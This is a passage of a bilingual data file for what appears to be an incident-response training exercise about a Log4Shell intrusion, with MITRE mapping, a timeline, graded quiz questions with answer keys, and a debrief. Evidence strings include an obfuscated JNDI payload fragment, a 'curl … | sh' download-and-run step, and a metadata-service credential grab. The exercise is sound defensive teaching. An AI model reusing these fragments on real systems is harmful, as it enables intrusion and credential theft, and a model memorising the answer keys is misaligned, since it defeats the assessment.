          evidence: { fr: 'En-tête X-Api-Version contenant une expression JNDI, HTTP 200.', en: 'X-Api-Version header carrying a JNDI expression, HTTP 200.' },
        },
        {
          id: 'T1059.004',
          name: { fr: 'Interpréteur de commandes : shell Unix', en: 'Command and Scripting Interpreter: Unix Shell' },
          tactic: 'execution',
          url: 'https://attack.mitre.org/techniques/T1059/004/',
          observed: true,
          evidence: { fr: 'java (tomcat9) → /bin/sh -c "curl … | sh".', en: 'java (tomcat9) → /bin/sh -c "curl … | sh".' },
        },
        {
          id: 'T1105',
          name: { fr: "Transfert d'outil entrant", en: 'Ingress Tool Transfer' },
          tactic: 'command-and-control',
          url: 'https://attack.mitre.org/techniques/T1105/',
          observed: true,
          evidence: { fr: 'Téléchargement de a.sh puis du binaire de minage.', en: 'Download of a.sh then of the mining binary.' },
        },
        {
          id: 'T1552.005',
          name: {
            fr: "Identifiants non protégés : API de métadonnées d'instance",
            en: 'Unsecured Credentials: Cloud Instance Metadata API',
          },
          tactic: 'credential-access',
          url: 'https://attack.mitre.org/techniques/T1552/005/',
          observed: true,
          evidence: { fr: 'curl vers 169.254.169.254/…/role-web-prod, HTTP 200.', en: 'curl to 169.254.169.254/…/role-web-prod, HTTP 200.' },
        },
        {
          id: 'T1098.004',
          name: { fr: 'Manipulation de compte : clés SSH autorisées', en: 'Account Manipulation: SSH Authorized Keys' },
          tactic: 'persistence',
          url: 'https://attack.mitre.org/techniques/T1098/004/',
          observed: true,
          evidence: { fr: 'Écriture dans /home/tomcat/.ssh/authorized_keys.', en: 'Write to /home/tomcat/.ssh/authorized_keys.' },
        },
        {
          id: 'T1021.004',
          name: { fr: 'Services distants : SSH', en: 'Remote Services: SSH' },
          tactic: 'lateral-movement',
          url: 'https://attack.mitre.org/techniques/T1021/004/',
          observed: true,
          evidence: { fr: 'Accepted publickey for deploy sur APP-INT-02 à 03:41.', en: 'Accepted publickey for deploy on APP-INT-02 at 03:41.' },
        },
        {
          id: 'T1496',
          name: { fr: 'Détournement de ressources', en: 'Resource Hijacking' },
          tactic: 'impact',
          url: 'https://attack.mitre.org/techniques/T1496/',
          observed: true,
          evidence: { fr: 'Mineur à 98 % de CPU, pool externe en TLS.', en: 'Miner at 98% CPU, external pool over TLS.' },
        },
        {
          id: 'T1566.001',
          name: { fr: 'Hameçonnage : pièce jointe', en: 'Phishing: Spearphishing Attachment' },
          tactic: 'initial-access',
          url: 'https://attack.mitre.org/techniques/T1566/001/',
          observed: false,
        },
        {
          id: 'T1003.001',
          name: { fr: "Vidage d'identifiants : mémoire LSASS", en: 'OS Credential Dumping: LSASS Memory' },
          tactic: 'credential-access',
          url: 'https://attack.mitre.org/techniques/T1003/001/',
          observed: false,
        },
        {
          id: 'T1486',
          name: { fr: 'Chiffrement de données pour impact', en: 'Data Encrypted for Impact' },
          tactic: 'impact',
          url: 'https://attack.mitre.org/techniques/T1486/',
          observed: false,
        },
      ],
      question: {
        id: 'l2-q-mitre',
        points: 18,
        multi: true,
        prompt: {
          fr: 'Quelles techniques vos preuves soutiennent-elles ?',
          en: 'Which techniques does your evidence support?',
        },
        options: [
          { id: 'T1190', label: { fr: 'T1190 — Exploitation d’application exposée', en: 'T1190 — Exploit Public-Facing Application' } },
          { id: 'T1059.004', label: { fr: 'T1059.004 — Shell Unix', en: 'T1059.004 — Unix Shell' } },
          { id: 'T1105', label: { fr: 'T1105 — Transfert d’outil entrant', en: 'T1105 — Ingress Tool Transfer' } },
          { id: 'T1552.005', label: { fr: 'T1552.005 — API de métadonnées d’instance', en: 'T1552.005 — Cloud Instance Metadata API' } },
          { id: 'T1098.004', label: { fr: 'T1098.004 — Clés SSH autorisées', en: 'T1098.004 — SSH Authorized Keys' } },
          { id: 'T1021.004', label: { fr: 'T1021.004 — SSH', en: 'T1021.004 — SSH' } },
          { id: 'T1496', label: { fr: 'T1496 — Détournement de ressources', en: 'T1496 — Resource Hijacking' } },
          {
            id: 'T1566.001',
            label: { fr: 'T1566.001 — Hameçonnage', en: 'T1566.001 — Phishing' },
            feedback: {
              fr: "Aucun mail n'intervient : l'accès initial est une requête HTTP sur un service exposé.",
              en: 'No email is involved: initial access is an HTTP request against an exposed service.',
            },
          },
          {
            id: 'T1003.001',
            label: { fr: 'T1003.001 — Dump LSASS', en: 'T1003.001 — LSASS dumping' },
            feedback: {
              fr: "LSASS est un processus Windows. Le serveur compromis tourne sous Linux — le vol d'identifiants s'est fait via l'API de métadonnées.",
              en: 'LSASS is a Windows process. The compromised server runs Linux — credential theft happened through the metadata API.',
            },
          },
          {
            id: 'T1486',
            label: { fr: 'T1486 — Chiffrement pour impact', en: 'T1486 — Data Encrypted for Impact' },
            feedback: {
              fr: "Le mineur consomme du CPU, il ne chiffre rien. Confondre minage et rançongiciel change complètement la réponse déclenchée.",
              en: 'The miner burns CPU, it encrypts nothing. Confusing mining with ransomware completely changes the response you trigger.',
            },
          },
        ],
        correct: ['T1190', 'T1059.004', 'T1105', 'T1552.005', 'T1098.004', 'T1021.004', 'T1496'],
        explanation: {
          fr: "Cet incident illustre une chaîne cloud complète : exploitation d'un composant vulnérable, exécution dans le contexte du service, vol des identifiants d'instance, persistance par clés SSH, rebond interne et impact visible. Le mapping doit refléter la réalité observée, y compris ce qui est « peu spectaculaire » comme T1552.005 — c'est précisément la technique qui a le plus d'impact ici.",
          en: 'This incident shows a complete cloud chain: exploitation of a vulnerable component, execution in the service context, instance credential theft, SSH key persistence, internal pivot and visible impact. The mapping must reflect what was observed, including the "unspectacular" T1552.005 — which happens to be the highest-impact technique here.',
        },
      },
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'timeline',
      id: 'l2-timeline',
      title: { fr: 'Reconstruction', en: 'Reconstruction' },
      points: 18,
      intro: {
        fr: "Dix événements, quatre sources différentes. Cette chronologie est ce que liront le RSSI, l'assureur et, si des données personnelles sont concernées, l'autorité de contrôle.",
        en: 'Ten events, four different sources. This timeline is what the CISO, the insurer and — if personal data is involved — the regulator will read.',
      },
      events: [
        { id: 'l2-t1', time: '02:41', label: { fr: 'Début du scan de masse JNDI, bloqué par le WAF', en: 'Mass JNDI scanning starts, blocked by the WAF' } },
        { id: 'l2-t2', time: '03:02', label: { fr: 'Requête obfusquée dans un en-tête non inspecté — HTTP 200', en: 'Obfuscated payload in an uninspected header — HTTP 200' } },
        { id: 'l2-t3', time: '03:02', label: { fr: 'Résolution LDAP sortante vers le serveur de l’attaquant', en: 'Outbound LDAP lookup to the attacker server' } },
        { id: 'l2-t4', time: '03:03', label: { fr: 'Tomcat lance un shell et télécharge la charge utile', en: 'Tomcat spawns a shell and downloads the payload' } },
        { id: 'l2-t5', time: '03:04', label: { fr: 'Vol des identifiants du rôle via le service de métadonnées', en: 'Instance role credentials stolen via the metadata service' } },
        { id: 'l2-t6', time: '03:06', label: { fr: 'Persistance : clé SSH ajoutée et tâche cron @reboot', en: 'Persistence: SSH key added and @reboot cron job' } },
        { id: 'l2-t7', time: '03:07', label: { fr: 'Utilisation des identifiants volés depuis Internet (214 objets lus)', en: 'Stolen credentials used from the internet (214 objects read)' } },
        { id: 'l2-t8', time: '03:09', label: { fr: 'Lancement du mineur, CPU à 98 %', en: 'Miner launched, CPU at 98%' } },
        { id: 'l2-t9', time: '03:14', label: { fr: 'Alerte SIEM sur le flux LDAP sortant', en: 'SIEM alert on the outbound LDAP flow' } },
        { id: 'l2-t10', time: '03:41', label: { fr: 'Rebond SSH vers APP-INT-02 avec la clé de déploiement', en: 'SSH pivot to APP-INT-02 with the deployment key' } },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'decision',
      id: 'l2-decision',
      title: { fr: 'Endiguement et éradication', en: 'Containment and eradication' },
      intro: {
        fr: "Le serveur sert encore le catalogue et il est 4 h du matin. Vous avez le droit d'isoler en autonomie ; couper le service nécessite l'astreinte métier. Décidez.",
        en: 'The server is still serving the catalogue and it is 4 a.m. You are authorised to isolate on your own; taking the service down needs the business on-call. Decide.',
      },
      questions: [
        {
          id: 'l2-q-contain',
          points: 18,
          multi: true,
          prompt: { fr: 'Que faites-vous maintenant ?', en: 'What do you do now?' },
          options: [
            {
              id: 'isolate',
              label: {
                fr: 'Isoler WEB-PROD-03 (groupe de sécurité en sortie + isolation EDR), machine maintenue allumée',
                en: 'Isolate WEB-PROD-03 (egress security group + EDR isolation), machine kept powered on',
              },
            },
            {
              id: 'rotate-cloud',
              label: {
                fr: "Révoquer et faire tourner les identifiants du rôle d'instance, puis auditer tous les appels API faits avec",
                en: 'Revoke and rotate the instance role credentials, then audit every API call made with them',
              },
              awardsBadge: 'cloud-creds',
            },
            {
              id: 'patch',
              label: {
                fr: 'Corriger à la source : mettre à jour log4j-core (ou retirer la classe JndiLookup) sur WEB-PROD-03 et WEB-PROD-07',
                en: 'Fix at the source: update log4j-core (or strip the JndiLookup class) on WEB-PROD-03 and WEB-PROD-07',
              },
              awardsBadge: 'patch-not-mask',
            },
            {
              id: 'hunt',
              label: {
                fr: 'Lancer la chasse rétroactive sur 30 jours avec les IOC, et révoquer la clé SSH partout où elle est autorisée',
                en: 'Run a 30-day retro-hunt with the IOCs, and revoke the SSH key everywhere it is authorised',
              },
            },
            {
              id: 'waf-only',
              label: {
                fr: "Ajouter une règle WAF bloquant « ${jndi: » et considérer l'incident réglé",
                en: 'Add a WAF rule blocking "${jndi:" and consider the incident handled',
              },
              feedback: {
                fr: "C'est exactement ce qui a échoué cette nuit. Une règle littérale se contourne par obfuscation, et elle ne retire ni la clé SSH, ni le cron, ni les identifiants déjà volés.",
                en: 'That is exactly what failed tonight. A literal rule is bypassed by obfuscation, and it removes neither the SSH key, nor the cron, nor the already-stolen credentials.',
              },
            },
            {
              id: 'restart',
              label: {
                fr: 'Redémarrer Tomcat pour « repartir propre »',
                en: 'Restart Tomcat to "start clean"',
              },
              feedback: {
                fr: "Le redémarrage détruit la mémoire du processus — votre meilleure source de preuve — et relance le cron @reboot. Vous perdez les preuves et gardez l'attaquant.",
                en: 'A restart destroys process memory — your best evidence source — and triggers the @reboot cron. You lose the evidence and keep the attacker.',
              },
            },
          ],
          correct: ['isolate', 'rotate-cloud', 'patch', 'hunt'],
          explanation: {
            fr: "Sur un incident cloud, l'endiguement a deux moitiés : la machine et l'identité. Isoler l'instance ne révoque pas des identifiants temporaires déjà sortis — ils restent valables jusqu'à expiration ou révocation explicite. Ensuite seulement vient l'éradication : corriger le composant vulnérable (le WAF n'est qu'un pansement le temps du correctif), retirer les persistances, et étendre la recherche au reste du parc. Les deux pièges de cette question sont les deux réflexes les plus coûteux : confondre contournement et correction, et redémarrer avant d'avoir collecté.",
            en: 'On a cloud incident, containment has two halves: the machine and the identity. Isolating the instance does not revoke temporary credentials that already left — they stay valid until expiry or explicit revocation. Only then comes eradication: fix the vulnerable component (the WAF is just a plaster while the patch lands), remove the persistence, and widen the search to the rest of the estate. The two traps here are the two costliest reflexes: confusing mitigation with remediation, and restarting before collecting.',
          },
        },
        {
          id: 'l2-q-miner',
          points: 10,
          prompt: {
            fr: 'Le mineur consomme 98 % du CPU. Quelle lecture en faites-vous ?',
            en: 'The miner is burning 98% of the CPU. How do you read that?',
          },
          options: [
            {
              id: 'noise',
              label: {
                fr: "Le minage est l'impact bruyant mais accessoire : l'accès initial, les identifiants cloud volés et la clé SSH sont le vrai problème.",
                en: 'Mining is the noisy but secondary impact: initial access, the stolen cloud credentials and the SSH key are the real problem.',
              },
            },
            {
              id: 'low-impact',
              label: {
                fr: "L'attaquant ne cherchait que du calcul gratuit : impact faible, on peut clore après nettoyage.",
                en: 'The attacker only wanted free compute: low impact, close after cleanup.',
              },
              feedback: {
                fr: "214 objets lus dans un bucket de facturation contredisent cette lecture. Le minage finance l'opération, il ne la définit pas.",
                en: '214 objects read from an invoicing bucket contradict that reading. Mining funds the operation, it does not define it.',
              },
            },
            {
              id: 'kill-first',
              label: {
                fr: 'Tuer immédiatement le processus pour rétablir les performances, puis analyser.',
                en: 'Kill the process immediately to restore performance, then analyse.',
              },
              feedback: {
                fr: "Tuer le processus supprime la mémoire, les connexions ouvertes et les arguments de ligne de commande. Et sans endiguement, le cron le relance au prochain démarrage.",
                en: 'Killing the process destroys memory, open connections and command-line arguments. And without containment, the cron restarts it at next boot.',
              },
            },
            {
              id: 'fp',
              label: { fr: "C'est un faux positif de l'EDR sur un batch nocturne.", en: 'An EDR false positive on a nightly batch job.' },
              feedback: {
                fr: 'Un batch légitime ne se connecte pas à un pool de minage externe en TLS depuis /opt/.cache.',
                en: 'A legitimate batch job does not connect to an external mining pool over TLS from /opt/.cache.',
              },
            },
          ],
          correct: ['noise'],
          explanation: {
            fr: "Le minage est souvent la charge utile de dernière minute d'un accès revendu ou opportuniste : c'est ce qui se voit, pas ce qui coûte. Un analyste qui classe l'incident sur son symptôme le plus visible passe à côté de l'essentiel — ici, un accès aux données de facturation et une clé donnant du mouvement latéral. Hiérarchisez toujours l'impact par la valeur de ce qui a été atteint, jamais par le bruit généré.",
            en: 'Mining is often the last-minute payload of resold or opportunistic access: it is what shows, not what costs. An analyst who classifies an incident by its most visible symptom misses the point — here, access to invoicing data and a key enabling lateral movement. Always rank impact by the value of what was reached, never by the noise produced.',
          },
        },
        {
          id: 'l2-q-forensics',
          points: 10,
          prompt: {
            fr: 'Le métier veut reconstruire le serveur depuis la chaîne de déploiement. Que faites-vous avant ?',
            en: 'The business wants to rebuild the server from the deployment pipeline. What do you do first?',
          },
          options: [
            {
              id: 'collect',
              label: {
                fr: 'Collecter mémoire, image disque, journaux Tomcat, auth.log, cron, authorized_keys et journaux WAF — puis reconstruire.',
                en: 'Collect memory, disk image, Tomcat logs, auth.log, cron, authorized_keys and WAF logs — then rebuild.',
              },
            },
            {
              id: 'rebuild-now',
              label: {
                fr: 'Reconstruire tout de suite : le pipeline garantit un serveur propre, la preuve est secondaire.',
                en: 'Rebuild right away: the pipeline guarantees a clean server, evidence is secondary.',
              },
              feedback: {
                fr: "Reconstruire est la bonne éradication — mais après collecte. Sans preuve, impossible de savoir ce qui a été lu, ni de répondre à l'assureur ou au régulateur.",
                en: 'Rebuilding is the right eradication — but after collection. With no evidence you cannot know what was read, nor answer the insurer or the regulator.',
              },
            },
            {
              id: 'app-logs',
              label: { fr: 'Exporter uniquement les journaux applicatifs.', en: 'Export the application logs only.' },
              feedback: {
                fr: "Les journaux applicatifs ne contiennent ni la persistance, ni les connexions sortantes, ni la mémoire du processus compromis.",
                en: 'Application logs contain neither the persistence, nor the outbound connections, nor the memory of the compromised process.',
              },
            },
            {
              id: 'waf-export',
              label: { fr: 'Exporter la configuration du WAF pour la revue.', en: 'Export the WAF configuration for review.' },
              feedback: {
                fr: "Utile pour le retour d'expérience, inutile comme preuve de ce qui s'est passé sur le serveur.",
                en: 'Useful for the post-mortem, useless as evidence of what happened on the server.',
              },
            },
          ],
          correct: ['collect'],
          explanation: {
            fr: "L'ordre est toujours le même : endiguer, collecter, éradiquer, restaurer. Reconstruire depuis un pipeline propre est excellent — c'est même la meilleure éradication possible — mais une machine détruite avant collecte transforme l'incident en devinette. Sur une instance cloud, pensez aussi à prendre un instantané du volume avant de le détacher : c'est la version cloud de l'image disque.",
            en: 'The order never changes: contain, collect, eradicate, restore. Rebuilding from a clean pipeline is excellent — it is the best eradication available — but a machine destroyed before collection turns the incident into guesswork. On a cloud instance, also snapshot the volume before detaching it: that is the cloud version of a disk image.',
          },
        },
      ],
    },

    /* ---------------------------------------------------------------- */
    {
      kind: 'debrief',
      id: 'l2-debrief',
      title: { fr: 'Débrief', en: 'Debrief' },
      summary: {
        fr: "Une alerte réseau apparemment technique a révélé une chaîne complète : exploitation d'une bibliothèque vulnérable connue, exécution de code, vol d'identifiants cloud exploités depuis Internet, persistance double, rebond interne et détournement de ressources. Cinq minutes séparent l'exploitation du vol des identifiants cloud, trente-neuf du rebond vers le réseau interne.",
        en: 'One seemingly technical network alert surfaced a full chain: exploitation of a known vulnerable library, code execution, cloud credential theft used from the internet, double persistence, internal pivot and resource hijacking. Five minutes separate exploitation from the cloud credential theft, thirty-nine from the pivot into the internal network.',
      },
      facts: [
        { label: { fr: 'Classification', en: 'Classification' }, value: { fr: 'Vrai positif — Intrusion / exploitation applicative', en: 'True positive — Intrusion / application exploitation' } },
        { label: { fr: 'Sévérité', en: 'Severity' }, value: { fr: 'Critique', en: 'Critical' } },
        { label: { fr: 'Vulnérabilité', en: 'Vulnerability' }, value: { fr: 'CVE-2021-44228, log4j-core 2.14.1 (dépendance transitive)', en: 'CVE-2021-44228, log4j-core 2.14.1 (transitive dependency)' } },
        { label: { fr: 'Temps de détection', en: 'Time to detect' }, value: { fr: '12 minutes (03:02 → 03:14)', en: '12 minutes (03:02 → 03:14)' } },
        { label: { fr: 'Données atteintes', en: 'Data reached' }, value: { fr: '214 objets lus dans 2 buckets, dont archives de facturation', en: '214 objects read across 2 buckets, including invoice archives' } },
        { label: { fr: 'Systèmes touchés', en: 'Systems affected' }, value: { fr: 'WEB-PROD-03 (compromis), APP-INT-02 (rebond), WEB-PROD-07 (vulnérable)', en: 'WEB-PROD-03 (compromised), APP-INT-02 (pivot), WEB-PROD-07 (vulnerable)' } },
      ],
      lessons: [
        {
          fr: "Un WAF est un contournement temporaire, pas un correctif. Il protège ce qu'il inspecte, et seulement tant que la charge utile ressemble à ce qu'il connaît.",
          en: 'A WAF is a temporary mitigation, not a fix. It protects what it inspects, and only while the payload looks like something it knows.',
        },
        {
          fr: "Dans le cloud, l'identité voyage plus vite que la machine : des identifiants d'instance volés restent valables même après l'isolation du serveur.",
          en: 'In the cloud, identity travels faster than the machine: stolen instance credentials stay valid even after the server is isolated.',
        },
        {
          fr: "Le symptôme le plus visible n'est presque jamais l'impact principal. Le mineur fait le bruit ; la lecture des buckets fait le dommage.",
          en: 'The most visible symptom is almost never the main impact. The miner makes the noise; the bucket reads do the damage.',
        },
        {
          fr: "Une clé de déploiement partagée entre DMZ et réseau interne annule le cloisonnement qu'on croit avoir.",
          en: 'A deployment key shared between the DMZ and the internal network cancels the segmentation you think you have.',
        },
      ],
      rootCause: [
        { fr: 'Bibliothèque vulnérable connue, en dépendance transitive, non traitée malgré un ticket ouvert.', en: 'Known vulnerable library, pulled in transitively, untreated despite an open ticket.' },
        { fr: 'Signature WAF limitée à un sous-ensemble de champs et sensible à l’obfuscation.', en: 'WAF signature limited to a subset of fields and sensitive to obfuscation.' },
        { fr: 'Rôle d’instance trop permissif (lecture de buckets sans rapport avec le catalogue).', en: 'Over-permissive instance role (read access to buckets unrelated to the catalogue).' },
        { fr: 'Service de métadonnées accessible sans protection renforcée depuis le conteneur applicatif.', en: 'Metadata service reachable without hardened protection from the application context.' },
        { fr: 'Clé SSH de déploiement partagée entre la DMZ et le réseau interne.', en: 'Deployment SSH key shared between the DMZ and the internal network.' },
      ],
      remediation: [
        { fr: 'Mettre à jour Log4j sur tout le parc et inventorier les dépendances transitives (SBOM à jour).', en: 'Update Log4j across the estate and inventory transitive dependencies (keep the SBOM current).' },
        { fr: 'Imposer la version renforcée du service de métadonnées et réduire les droits du rôle au strict nécessaire.', en: 'Enforce the hardened metadata service version and cut the role down to least privilege.' },
        { fr: 'Interdire les flux sortants non nécessaires depuis la DMZ (LDAP, RMI, HTTP direct vers IP).', en: 'Block unnecessary egress from the DMZ (LDAP, RMI, direct-to-IP HTTP).' },
        { fr: 'Clés SSH distinctes par zone, rotation automatisée, interdiction des clés partagées.', en: 'Separate SSH keys per zone, automated rotation, no shared keys.' },
        { fr: "Détection : toute résolution sortante depuis un serveur applicatif, et tout appel au service de métadonnées suivi d'un usage hors cloud.", en: 'Detection: any outbound lookup from an application server, and any metadata call followed by out-of-cloud usage.' },
      ],
      report: {
        fr: "INC-2026-0922-02 — Exploitation d'une application exposée, plateforme e-commerce.\nVecteur : requête HTTP GET /catalogue/api/v2/items portant, dans l'en-tête X-Api-Version, une expression JNDI obfusquée (${${lower:j}ndi:…}). L'en-tête est journalisé par l'application, qui embarque log4j-core 2.14.1 (CVE-2021-44228). Le WAF avait bloqué 4 127 tentatives antérieures, mais n'inspectait pas cet en-tête.\nChaîne : résolution LDAP sortante vers 203.0.113.77:1389 → exécution de /bin/sh sous le compte tomcat → vol des identifiants du rôle d'instance via 169.254.169.254 → utilisation de ces identifiants depuis Internet (214 objets lus dans mireno-catalog-media et mireno-invoices-archive) → persistance par clé SSH et cron @reboot → mineur → rebond SSH vers APP-INT-02 et lecture de /srv/app/config/database.yml.\nEndiguement : isolation réseau de WEB-PROD-03 sans extinction, révocation et rotation du rôle d'instance, audit complet des appels API, retrait des persistances, correction de Log4j sur WEB-PROD-03 et WEB-PROD-07.\nSuites : rotation des identifiants de base présents dans database.yml, chasse rétroactive 30 jours, revue des droits du rôle et des clés SSH partagées.",
        en: "INC-2026-0922-02 — Public-facing application exploitation, e-commerce platform.\nVector: an HTTP GET /catalogue/api/v2/items request carrying an obfuscated JNDI expression (${${lower:j}ndi:…}) in the X-Api-Version header. The header is logged by the application, which ships log4j-core 2.14.1 (CVE-2021-44228). The WAF had blocked 4,127 earlier attempts but did not inspect that header.\nChain: outbound LDAP lookup to 203.0.113.77:1389 → /bin/sh execution under the tomcat account → instance role credential theft via 169.254.169.254 → use of those credentials from the internet (214 objects read across mireno-catalog-media and mireno-invoices-archive) → persistence via SSH key and @reboot cron → miner → SSH pivot to APP-INT-02 and read of /srv/app/config/database.yml.\nContainment: network isolation of WEB-PROD-03 without power-off, revocation and rotation of the instance role, full API call audit, persistence removal, Log4j remediation on WEB-PROD-03 and WEB-PROD-07.\nFollow-up: rotation of the database credentials found in database.yml, 30-day retro-hunt, review of role permissions and shared SSH keys.",
      },
    },
  ],
};
